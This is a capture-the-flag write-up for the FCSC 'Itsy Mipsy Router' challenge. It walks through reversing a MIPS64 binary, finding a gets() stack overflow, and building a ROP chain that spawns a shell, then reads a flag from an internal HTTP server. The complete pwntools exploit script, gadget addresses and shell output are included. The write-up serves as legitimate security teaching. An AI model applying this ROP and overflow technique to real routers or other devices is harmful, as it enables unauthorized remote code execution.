# Itsy Mipsy Router (200 pts)

Itsy Mipsy Router is a pwn challenge I did during the [FCSC event](https://www.france-cybersecurity-challenge.fr). 
It's not a very hard challenge but I found it very interesting because it was my first mips pwn challenge !

## Setup

So basically we got this: 
>On vous demander d'auditer un routeur à l'interface entre Internet et un réseau interne d'une entreprise. Le client vous demande si il est possible de lire les fichiers stockés sur la machine filer qui sert de serveur de fichiers HTTP.
>nc challenges2.france-cybersecurity-challenge.fr 4005

And for debugging purposes administrators provided a Docker file:
```
FROM debian:buster-slim
RUN apt update
RUN apt install -yq socat qemu-user libc6-mips64-cross
RUN apt clean
RUN rm -rf /var/lib/apt/lists/

WORKDIR /app
COPY ./mipsy ./
RUN rm /etc/ld.so.cache

EXPOSE 4000
EXPOSE 1234
CMD socat tcp-listen:4000,reuseaddr,fork exec:"qemu-mips64 -L /usr/mips64-linux-gnuabi64 ./mipsy"
```
So because it's not very convenient to debug it from the docker I tried to run it directly on my host with a gdb stub on port 5445. I setup my host by installing the right packages, deleting `/etc/ld.so.cache` and by the socat command on port 4000: 
```
$ uname -a
Linux off 5.8.0-50-generic #56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
$ sudo apt install socat qemu-user libc6-mips64-cross
Lecture des listes de paquets... Fait
Construction de l'arbre des dépendances       
Lecture des informations d'état... Fait
socat est déjà la version la plus récente (1.7.3.3-2).
libc6-mips64-cross est déjà la version la plus récente (2.30-0ubuntu2cross2).
qemu-user est déjà la version la plus récente (1:4.2-3ubuntu6.15).
0 mis à jour, 0 nouvellement installés, 0 à enlever et 17 non mis à jour.
$ sudo rm -f /etc/ld.so.cache
$ socat tcp-listen:4000,reuseaddr,fork exec:"qemu-mips64 -L /usr/mips64-linux-gnuabi64 -g 5445 ./mipsy"
```
We can debug the running process with gdb-multiarch (with the path of my pwndbg's gdbinit to get an cleaner output).
```
$ gdb-multiarch -ex 'source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py' -q ./mipsy
Reading symbols from ./mipsy...
(No debugging symbols found in ./mipsy)
pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> target remote localhost:5445

```
To send the payload  I used [pwntools](https://github.com/Gallopsled/pwntools).
```py
from pwn import *

def start():
    # return remote("challenges2.france-cybersecurity-challenge.fr", 4005)
    return remote("localhost", 4000)

io = start()
print(io.recvuntil("] ").decode('utf-8'))
```

Now we launch the python script to trigger the socat:
```
$ python3 wu.py                                                               
[+] Opening connection to localhost on port 4000: Done
```

It does not return anything because it breaks in the shared libraries I guess, so now we can continue the execution in gdb: 
```
Remote debugging using localhost:5445
warning: Unable to find dynamic linker breakpoint function.
GDB will be unable to debug shared library initializers
and track explicitly loaded dynamic code.
0x00000040008038d0 in ?? ()
Could not check ASLR: Couldn't get personality
Downloading '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy' from the remote server: OK
add-symbol-file /tmp/tmpsjb8mqsa/mipsy 0x120000000 -s .MIPS.abiflags 0x2400002e0 -s .MIPS.options 0x2400002f8 -s .note.gnu.build-id 0x240000870 -s .dynamic 0x240000898 -s .hash 0x240000aa8 -s .dynsym 0x240001190 -s .dynstr 0x240002858 -s .gnu.version 0x240003b12 -s .gnu.version_r 0x240003cf8 -s .rel.dyn 0x240003d38 -s .init 0x240003d58 -s .text 0x240003de0 -s .MIPS.stubs 0x2400257a0 -s .fini 0x2400259c0 -s .rodata 0x240025a10 -s .interp 0x24002d280 -s .eh_frame_hdr 0x24002d290 -s .eh_frame 0x24002d2a8 -s .note.ABI-tag 0x24002d2e0 -s .ctors 0x24003df58 -s .dtors 0x24003df68 -s .data.rel.ro 0x24003df78 -s .data 0x240040000 -s .rld_map 0x240040020 -s .got 0x240040030 -s .sdata 0x240040840 -s .bss 0x240040850
'context': Print out the current register, instruction, and stack context.
Exception occurred: context: unsupported operand type(s) for +: 'NoneType' and 'int' (<class 'TypeError'>)
For more info invoke `set exception-verbose on` and rerun the command
or debug it by yourself with `set exception-debugger on`
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
       0x120000000        0x12002e000 r-xp    2e000 0      /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
       0x12002e000        0x12003d000 ---p     f000 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
       0x12003d000        0x120040000 r--p     3000 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
       0x120040000        0x120043000 rw-p     3000 30000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
      0x4000403000       0x4000828000 r--p   425000 0      <explored>
      0x40007fe000       0x4000801000 rw-p     3000 0      [stack]

[QEMU target detected - vmmap result might not be accurate; see `help vmmap`]
pwndbg> continue
Continuing.
warning: Could not load shared library symbols for 2 libraries, e.g. /lib/libc.so.6.
Use the "info sharedlibrary" command to see the complete listing.
Do you need "set solib-search-path" or "set sysroot"?
[Inferior 1 (process 1) exited normally]
```

The process exited because we didn't inserted any breakpoints and so our python script outs this: 
```
+---------------------------------+
|/                               \|
|        ITSY MIPSY ROUTER        |
|\                               /|
+---------------------------------+

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] 
```

We're able to debug properly our process !

## Reverse Engineering 

We can take a look at the binary by running the file command:
```
$ file mipsy                                                                  
mipsy: ELF 64-bit MSB executable, MIPS, MIPS64 rel2 version 1 (SYSV), dynamically linked, interpreter /lib64/ld.so.1, BuildID[sha1]=e20cf7872e96482095ce68e6d4d03806d5928de4, for GNU/Linux 3.2.0, not stripped
```
So it's a mips64 big endian binary dynamically linked. As we see above, the program is asking for an input among 4 options: Quit, Show network interfaces, Ping internal HTTP file server and Login as admin. We can test these options remotely:
```
+---------------------------------+
|/                               \|
|        ITSY MIPSY ROUTER        |
|\                               /|
+---------------------------------+

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] $ 1
The router has the following network interfaces:
* lo
* eth0
* eth2
* eth1

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] $ 2
Success: HTTP file server is up!

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] $ 3
Input your password:
>>> l3eT_p4sS
Error: wrong password.

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] $ 0
```
It doesn't give any interesting informations so instead of fuzzing manually the binary to find the vulnerability, I reversed the main functions in IDA. And particulary the code of the the function corresponding to the "Login as admin" feature. The assembly code of this function looks like such:
```x86asm
.globl authenticate
authenticate:

var_40= -0x40
var_18= -0x18
var_10= -0x10
ret_addr= -8

daddiu  $sp, -0x90       ; Doubleword Add Immediate Unsigned
sd      $ra, 0x90+ret_addr($sp)  ; Store Doubleword
sd      $fp, 0x90+var_10($sp)  ; Store Doubleword
sd      $gp, 0x90+var_18($sp)  ; Store Doubleword
move    $fp, $sp
lui     $gp, 4           ; Load Upper Immediate
daddu   $gp, $t9         ; Doubleword Add Unsigned
daddiu  $gp, 0x3AA4      ; Doubleword Add Immediate Unsigned
dli     $v0, 0x120020000  ; Doubleword Load Immediate
daddiu  $a0, $v0, (aInputYourPassw - 0x120020000)  ; "Input your password:"
dla     $v0, puts        ; Load 64-bit address
move    $t9, $v0
jalr    $t9 ; puts       ; Jump And Link Register
nop
dli     $v0, 0x120020000  ; Doubleword Load Immediate
daddiu  $a0, $v0, (asc_120025B00 - 0x120020000)  ; ">>> "
dla     $v0, printf      ; Load 64-bit address
move    $t9, $v0
jalr    $t9 ; printf     ; Jump And Link Register
nop
dla     $v0, stdout      ; Load 64-bit address
ld      $v0, (stdout - 0x120042BC8)($v0)  ; Load Doubleword
move    $a0, $v0         ; stream
dla     $v0, fflush      ; Load 64-bit address
move    $t9, $v0
jalr    $t9 ; fflush     ; Jump And Link Register
nop
move    $a0, $fp
dla     $v0, gets        ; Load 64-bit address
move    $t9, $v0
jalr    $t9 ; gets       ; Jump And Link Register
nop
daddiu  $v0, $fp, 0x50   ; Doubleword Add Immediate Unsigned
li      $a2, 0x20  ; ' '  ; n
move    $a1, $zero       ; c
move    $a0, $v0         ; s
dla     $v0, memset      ; Load 64-bit address
move    $t9, $v0
jalr    $t9 ; memset     ; Jump And Link Register
nop
move    $a0, $fp         ; s
dla     $v0, strlen      ; Load 64-bit address
move    $t9, $v0
jalr    $t9 ; strlen     ; Jump And Link Register
nop
daddiu  $v1, $fp, 0x50   ; Doubleword Add Immediate Unsigned
move    $a2, $v1
move    $a1, $v0
move    $a0, $fp
dla     $v0, kdf         ; Load 64-bit address
move    $t9, $v0
bal     kdf              ; Branch Always and Link
nop
daddiu  $v1, $fp, 0x50   ; Doubleword Add Immediate Unsigned
li      $a2, 0x20  ; ' '  ; n
dli     $v0, 0x120020000  ; Doubleword Load Immediate
daddiu  $a1, $v0, (unk_120025B08 - 0x120020000)  ; s2
move    $a0, $v1         ; s1
dla     $v0, memcmp      ; Load 64-bit address
move    $t9, $v0
jalr    $t9 ; memcmp     ; Jump And Link Register
nop
bnez    $v0, loc_120004688  ; Branch on Not Zero
```
When I began this challenge I didn't know anything about mips64 assembly but thanks to auto comments in IDA and to [this](http://math-atlas.sourceforge.net/devel/assembly/mips-iv.pdf) and [this](https://write.lain.faith/~/Haskal/mips-rop/), I understood very quickly the main components of the architecture. And that's why I noticed a call to the `gets` function which as it's known read an arbitrary number of bytes from stdin to the buffer indicated in argument, and so in our case in `$fp`, which is initialized to `$sp-0x90`. Next the call to `gets`, `printf` and `fflush`, it calls `memset` to set every bytes of another buffer allocated next to our input to zero. Then it computes the length of our input and calls the `kdf` function with the following arguments: `kdf(char *input_password, int input_length, unsigned char *out)`. The kdf function is basically doing some encryption operations according to our input and its length and stores the result in the third argument.
And the result of this encryption routine is compared to a constant value with `memcmp`.

So we discovered the stack based buffer overflow which allows us to overwrite the saved instruction pointer saved at the functions's prologue.

## Exploitation

Since we understood the vulnerable function, we can represent the stackframe like that: 

```
$saved_fp-0x90+----------------------+
              |                      |
              |                      |
              |   buffer_password    |
              |                      |
              |                      |
$saved_fp-0x40+----------------------+
              |                      |
              |                      |
              |         out          |
              |                      |
$saved_fp-0x16+----------------------+
              |       saved_gp       |
$saved_fp-0x10+----------------------+
              |       saved_fp       |
   $saved_fp-8+----------------------+
              |       saved_ra       |
     $saved_fp+----------------------+
              |                      |
              |  calling function's  |
              |      stackframe      |
              |                      |
              |                      |
              +----------------------+
```

And so, according to this schema, we overwrite the saved `$ra` from a padding of `0x90-0x8=0x88` bytes.
But since we're able to jmp everywhere, we have to figure out what kind of technique we want to use.

#### One gadget ?

For an obsure reason, I thought the `gets` function had for badchar the NULL byte, so I was looking for a one gadget in the binary.
I discovered during the reverse engineering part an interesting snippet of code: 
```x86asm
.text:0000000120003FC0                 .globl ip
.text:0000000120003FC0 ip:                                      ; CODE XREF: main+260↓p
.text:0000000120003FC0                                          ; DATA XREF: LOAD:0000000120002438↑o ...
.text:0000000120003FC0
.text:0000000120003FC0 ret             = -0x1050
.text:0000000120003FC0 n_read          = -0x104C
.text:0000000120003FC0 fd              = -0x1048
.text:0000000120003FC0 var_1044        = -0x1044
.text:0000000120003FC0 buf             = -0x1040
.text:0000000120003FC0 ptr_binsh       = -0x40
.text:0000000120003FC0 dash_c          = -0x38
.text:0000000120003FC0 var_30          = -0x30
.text:0000000120003FC0 null            = -0x28
.text:0000000120003FC0 var_18          = -0x18
.text:0000000120003FC0 var_10          = -0x10
.text:0000000120003FC0 var_8           = -8
.text:0000000120003FC0
.text:0000000120003FC0                 daddiu  $sp, -0x1050     ; Doubleword Add Immediate Unsigned
.text:0000000120003FC4                 sd      $ra, 0x1050+var_8($sp)  ; Store Doubleword
.text:0000000120003FC8                 sd      $fp, 0x1050+var_10($sp)  ; Store Doubleword
.text:0000000120003FCC                 sd      $gp, 0x1050+var_18($sp)  ; Store Doubleword
.text:0000000120003FD0                 move    $fp, $sp
.text:0000000120003FD4                 lui     $gp, 4           ; Load Upper Immediate
.text:0000000120003FD8                 daddu   $gp, $t9         ; Doubleword Add Unsigned
.text:0000000120003FDC                 daddiu  $gp, 0x4060      ; Doubleword Add Immediate Unsigned
.text:0000000120003FE0                 dli     $v0, 0x120020000  ; Doubleword Load Immediate
.text:0000000120003FE4                 daddiu  $v0, (aBinSh - 0x120020000)  ; "/bin/sh"
.text:0000000120003FE8                 sd      $v0, 0x1010($fp)  ; Store Doubleword
.text:0000000120003FEC                 dli     $v0, 0x120020000  ; Doubleword Load Immediate
.text:0000000120003FF0                 daddiu  $v0, (aC - 0x120020000)  ; "-c"
.text:0000000120003FF4                 sd      $v0, 0x1018($fp)  ; Store Doubleword
.text:0000000120003FF8                 dli     $v0, 0x120020000  ; Doubleword Load Immediate
.text:0000000120003FFC                 daddiu  $v0, (aListInterfaces - 0x120020000)  ; "./list_interfaces.sh"
.text:0000000120004000                 sd      $v0, 0x1020($fp)  ; Store Doubleword
.text:0000000120004004                 sd      $zero, 0x1028($fp)  ; Store Doubleword
.text:0000000120004008                 daddiu  $v0, $fp, 8      ; Doubleword Add Immediate Unsigned
.text:000000012000400C                 move    $a0, $v0         ; pipedes
.text:0000000120004010                 dla     $v0, pipe        ; Load 64-bit address
.text:0000000120004014                 move    $t9, $v0
.text:0000000120004018                 jalr    $t9 ; pipe       ; Jump And Link Register
.text:000000012000401C                 nop
.text:0000000120004020                 move    $v1, $v0
.text:0000000120004024                 dli     $v0, 0xFFFFFFFFFFFFFFFF  ; Doubleword Load Immediate
.text:0000000120004028                 bne     $v1, $v0, loc_120004070  ; Branch on Not Equal
; skip
.text:0000000120004070 loc_120004070:                           ; CODE XREF: ip+68↑j
.text:0000000120004070                 dla     $v0, fork        ; Load 64-bit address
.text:0000000120004074                 move    $t9, $v0
.text:0000000120004078                 jalr    $t9 ; fork       ; Jump And Link Register
.text:000000012000407C                 nop
.text:0000000120004080                 sw      $v0, 0($fp)      ; Store Word
.text:0000000120004084                 lw      $v1, 0($fp)      ; Load Word
.text:0000000120004088                 dli     $v0, -1          ; Doubleword Load Immediate
.text:000000012000408C                 bne     $v1, $v0, loc_1200040D4  ; Branch on Not Equal
; skip
.text:00000001200040D4 loc_1200040D4:                           ; CODE XREF: ip+CC↑j
.text:00000001200040D4                 lw      $v0, 0($fp)      ; Load Word
.text:00000001200040D8                 bnez    $v0, loc_120004158  ; Branch on Not Zero
.text:00000001200040DC                 nop
.text:00000001200040E0                 lw      $v0, 0xC($fp)    ; Load Word
.text:00000001200040E4                 li      $a1, 1           ; fd2
.text:00000001200040E8                 move    $a0, $v0         ; fd
.text:00000001200040EC                 dla     $v0, dup2        ; Load 64-bit address
.text:00000001200040F0                 move    $t9, $v0
.text:00000001200040F4                 jalr    $t9 ; dup2       ; Jump And Link Register
.text:00000001200040F8                 nop
.text:00000001200040FC                 lw      $v0, 8($fp)      ; Load Word
.text:0000000120004100                 move    $a0, $v0         ; fd
.text:0000000120004104                 dla     $v0, close       ; Load 64-bit address
.text:0000000120004108                 move    $t9, $v0
.text:000000012000410C                 jalr    $t9 ; close      ; Jump And Link Register
.text:0000000120004110                 nop
.text:0000000120004114                 lw      $v0, 0xC($fp)    ; Load Word
.text:0000000120004118                 move    $a0, $v0         ; fd
.text:000000012000411C                 dla     $v0, close       ; Load 64-bit address
.text:0000000120004120                 move    $t9, $v0
.text:0000000120004124                 jalr    $t9 ; close      ; Jump And Link Register
.text:0000000120004128                 nop
.text:000000012000412C                 ld      $v0, 0x1010($fp)  ; Load Doubleword
.text:0000000120004130                 daddiu  $v1, $fp, 0x1010  ; Doubleword Add Immediate Unsigned
.text:0000000120004134                 move    $a2, $zero       ; envp
.text:0000000120004138                 move    $a1, $v1         ; argv
.text:000000012000413C                 move    $a0, $v0         ; path
.text:0000000120004140                 dla     $v0, execve      ; Load 64-bit address
.text:0000000120004144                 move    $t9, $v0
.text:0000000120004148                 jalr    $t9 ; execve     ; Jump And Link Register
.text:000000012000414C                 nop
; skip
```

It's a part of the `ip` function, called when we trigger the "Show network interfaces" option. When I saw at the begin of the function, some local variables like a pointer to the `"/bin/sh"` string and a block of code which executes especially `execve("/bin/sh", "-c", NULL)`. Since I discovered this basic block I thought I should have to jump around it with the right stackframe. But after a few hours I figured out it wasn't possible :(. And figured out too that the `NULL` byte isn't a badchar :).

#### ROPchain

Now we're able to craft a ropchain with only one badchar: "\n". To do so we can launch [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) to find some suitable gadgets:
```bash
$ ROPgadget --binary mipsy > gadgets
```

On mips architechture there is no `ret` or `pop` instructions, to handle this issue we use gadgets which load directly a 64 bit value stored in the stack into a register like this: 
```x86asm
ld $a0, 0x8($sp) ; It will read the doubleword in $sp+8 to load it in the $a0 register.
```
And to return we need to find a load on a register like `$t9` which is often used to resolve and call extern functions or on `$ra` which is the standard register used to store the address of the calling function.

And that's why it's too hard to find automatically gadgets for mips binaries. But fortunately, ROPgadgets finds a a great amount of gadgets which helps us a lot.

The exploitation would be for me to jmp to the execve's call with the right context.
The code looks like such: 

```x86asm
.text:0000000120004134                 move    $a2, $zero       ; envp
.text:0000000120004138                 move    $a1, $v1         ; argv
.text:000000012000413C                 move    $a0, $v0         ; path
.text:0000000120004140                 dla     $v0, execve      ; Load 64-bit address
.text:0000000120004144                 move    $t9, $v0
.text:0000000120004148                 jalr    $t9 ; execve     ; Jump And Link Register
.text:000000012000414C                 nop
```

To do so we have to:
- set `$v1` register to `NULL`
- set `$v0` register to a pointer to `/bin/sh`
- set `$gp`, the global pointer to the right value to be able do execute the `dla` instruction.

An important thing to notice is that on mips architechture, when an instruction is executed the next instruction is too executed despite of the result of the current instruction. So when we will choose our gadgets, we need to be careful according to the instruction after the control flow instruction.

And the good value for `$gp` is a constant from which the [`dla`](https://sourceware.org/binutils/docs-2.24/as/MIPS-Small-Data.html) instruction addresses memory areas. And if we check the value of `$gp` in gdb, we got: `0x120048020`.

To control the `$v1` register we can grep on the gadgets found by ROPgadget: 
```
$ grep "ld \$v0, " gadgets | grep \$sp
```
Then we got a lot of candidate which are not efficient. And if we're very careful we find an interesting gadget:
```
0x000000012001b4d8 : ld $v0, 0x210($sp) ; ld $t9, 0x228($sp) ; jalr $t9 ; move $a0, $s6
```
It's perfect because it allows us to control the value of `$v0` and the value of the next gadget that we can store in `$t9` to jump on !

We can apply process to find a gadget for $v1: 
```
$ grep "ld \$v1, " gadgets | grep \$sp
[skip]
0x000000012001270c : ld $v1, 0x80($sp) ; sd $v0, 0xf0($sp) ; dsubu $s5, $v0, $v1 ; dsll $v0, $s5, 6 ; ld $a0, 0xb8($sp) ; ld $t9, 0xe0($sp) ; move $a1, $v0 ; sd $v1, 0xf8($sp) ; jalr $t9 ; sd $v0, 0x100($sp)
[skip]
```
It's a gadget a bit more hard to understand but we just have to take care to: do not write `$v0`, control the value of `$v9` to jump on, control the value of `$v1`. And so this gadget is a good candidate.

Finally we need to control the value of the `$gp` register but to achieve that we do not need to use a gadget, because we already control it thanks to the vuln epilogue:
```x86asm
.text:00000001200046A4 loc_1200046A4:                           # CODE XREF: authenticate+104↑j
.text:00000001200046A4                 move    $sp, $fp
.text:00000001200046A8                 ld      $ra, 0x90+ret_addr($sp)  # Load Doubleword
.text:00000001200046AC                 ld      $fp, 0x90+var_10($sp)  # Load Doubleword
.text:00000001200046B0                 ld      $gp, 0x90+var_18($sp)  # Load Doubleword
.text:00000001200046B4                 daddiu  $sp, 0x90        # Doubleword Add Immediate Unsigned
.text:00000001200046B8                 jr      $ra              # Jump Register
.text:00000001200046BC                 nop
```

## Put all together

For the pruposes of mips exploitation I developped a small function in python which inserts automatically a value at an arbitrary offset.

```py
def make_pld(s, val, pos):
    if len(s) == pos:
        print(f"[*] Gadget: s += {val}")
        s += val
        return s
    elif len(s) > pos:
        print(f"[*] Gadget: {s[:pos-1]} + {val} + {s[pos-1+len(val):]}")
        s = s[:pos-1] + val + s[pos-1+len(val):]
        return s 
    elif len(s) < pos:
        k = "\x00"*(pos-len(s))
        print(f"[*] Gadget: {s} + {k} + {val}")
        return s + b"\x00"*(pos-len(s)) + val
```

It's very useful because we are then able to give the right offset about the stack pointer when we execute the gadgets.
We can begin by overwriting the value of the saved `$gp` and `$ra`:
```py
GP = 0x120048020
BASE_RSP = 0x90

pld  = make_pld(b"", p64(GP), BASE_RSP-0x18) # $gp
pld  = make_pld(pld, p64(SET_V1), BASE_RSP-0x8) # $ra
```
BASE_RSP is the offset of the input's buffer about the `$sp` address when we return and so when we start to execute some gadgets.
We indicate the gadget to execute which is the gadget which sets `$v1` register to zero.

Then we can put the right value in `$v1` by looking at the SET_V1 gadget which loads the doubleword in `0x80($sp)` in `$v1`.
So we have to add to our payload:
```py
pld  = make_pld(pld, p64(0x0), BASE_RSP+(0x80)) # $v1
```
And we have to set the right value for the next gadget to execute. The gadget loads the doubleword in `0xe0($sp)` in `$t9` and then jmp on, so we can add our SET_V0 gadget to be then executed:
```py
pld  = make_pld(pld, p64(SET_V0), BASE_RSP+(0xe0)) # $t9
```
We repeat the same operation for the SET_V0 gadget by setting a pointer to `'/bin/sh'` in `0x210($sp)` and the address of the final execve call in `0x228($sp)`:
```py
pld  = make_pld(pld, p64(BINSH), BASE_RSP+(0x210)) # $v0
pld  = make_pld(pld, p64(EXECVE), BASE_RSP+(0x228)) # $t9
```

We finished the ROPchain, now we just have to send it to the server and to enjoy the shell !

The final script looks like such:
```py
#!/usr/bin/python3
from pwn import ELF, context, remote, p64 

BINSH = 0x120025A20

e = ELF('mipsy')

context.bits = 64 # mips64
context.arch = "mips"
context.endian = "big" # Not a mipsel binary

def make_pld(s, val, pos):
    if len(s) == pos:
        s += val
        return s
    elif len(s) > pos:
        s = s[:pos-1] + val + s[pos-1+len(val):]
        return s 
    elif len(s) < pos:
        k = "\x00"*(pos-len(s))
        return s + b"\x00"*(pos-len(s)) + val 

SET_V0 = 0x12001B4D8 # : ld $v0, 0x210($sp) ; ld $t9, 0x228($sp) ; jalr $t9 ; move $a0, $s6

SET_V1 = 0x000000012001270c # : ld $v1, 0x80($sp) ; sd $v0, 0xf0($sp) ; dsubu $s5, $v0, $v1 ; dsll $v0, $s5, 6 ; ld $a0, 0xb8($sp) ; ld $t9, 0xe0($sp) ; move $a1, $v0 ; sd $v1, 0xf8($sp) ; jalr $t9 ; sd $v0, 0x100($sp)

EXECVE = 0x120004134

GP = 0x120048020
BASE_RSP = 0x90

def start():
    return remote("challenges2.france-cybersecurity-challenge.fr", 4005)
    # return remote("localhost", 4000)

io = start()
io.sendlineafter("] ", b"3")

pld  = make_pld(b"", p64(GP), BASE_RSP-0x18) # $gp
pld  = make_pld(pld, p64(SET_V1), BASE_RSP-0x8) # $ra
pld  = make_pld(pld, p64(0x0), BASE_RSP+(0x80)) # $v1
pld  = make_pld(pld, p64(SET_V0), BASE_RSP+(0xe0)) # $t9
pld  = make_pld(pld, p64(BINSH), BASE_RSP+(0x210)) # $v0
pld  = make_pld(pld, p64(EXECVE), BASE_RSP+(0x228)) # $t9

io.sendlineafter(">>> ", pld)
io.interactive()
```

## Final part

According to the statements we need to read some files stored on the filer machine.
So firstly let's run the exploit to get the shell:
```
$ ./solve.py                                                                  
[!] Could not emulate PLT instructions for ELF('mipsy/mipsy')
[!] Could not populate PLT: not enough values to unpack (expected 2, got 0)
[*] 'mipsy/mipsy'
    Arch:     mips64-64-big
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x120000000)
    RWX:      Has RWX segments
[+] Opening connection to challenges2.france-cybersecurity-challenge.fr on port 4005: Done
[*] Switching to interactive mode
Error: wrong password.
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
list_interfaces.sh
mipsy
$
```

We see no flag, so according to the statements maybe we have to curl the filer machine which seems to be a HTTP server:
```
$ curl filer
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href="flag">flag</a></li>
</ul>
<hr>
</body>
</html>
```

It's a directory listing of the files stored in filer, and so we just have to `curl filer/flag` to get the flag:
```
$ curl filer/flag
FCSC{82ed60ce9c8b1136b1da7df24c9996b6232671e66f62bad1bd0e3fc163761519}
```

And we got the flag !
This challenge was very cool because it's a "real world" scenario and it makes me discovering mips assembly !